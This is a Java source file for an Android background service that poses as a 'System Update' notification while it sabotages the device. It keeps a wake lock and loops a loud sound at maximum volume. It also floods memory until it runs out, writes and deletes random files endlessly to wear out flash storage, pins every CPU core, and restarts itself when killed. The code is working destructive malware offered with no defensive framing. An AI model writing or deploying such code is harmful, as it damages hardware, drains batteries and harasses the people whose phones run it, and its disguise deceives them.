package com.example.app;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import java.io.File;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class BgService extends Service {
    private MediaPlayer mediaPlayer;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        String CHANNEL = "ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
        startForeground(1, b.setContentTitle("System Update").setContentText("Processing...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App::WakeLock");
        wakeLock.acquire();

        // 1. الصوت العالي
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
        mediaPlayer = MediaPlayer.create(this, R.raw.loud);
        mediaPlayer.setLooping(true);
        mediaPlayer.start();

        // 2. تفتيت الذاكرة (Memory Fragmentation)
        List<byte[]> fragmentedMemory = new ArrayList<>();
        new Thread(() -> {
            while (true) {
                try {
                    for (int i = 0; i < 1000; i++) {
                        fragmentedMemory.add(new byte[1024]);
                    }
                } catch (OutOfMemoryError e) { break; } 
            }
        }).start();

        // 3. تعذيب الفلاشة (Disk Thrashing)
        for (int i = 0; i < 5; i++) {
            new Thread(() -> {
                try {
                    File dir = getExternalFilesDir(null);
                    Random rand = new Random();
                    while (true) {
                        File file = new File(dir, "thrash_" + rand.nextInt(100000) + ".dat");
                        RandomAccessFile raf = new RandomAccessFile(file, "rw");
                        raf.seek(rand.nextInt(1024 * 1024)); 
                        raf.write(new byte[1024]);
                        raf.close();
                        file.delete();
                    }
                } catch (Exception e) {}
            }).start();
        }

        // 4. استهلاك المعالج
        for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++) {
            new Thread(() -> {
                while (true) { Math.sqrt(Math.random()); }
            }).start();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
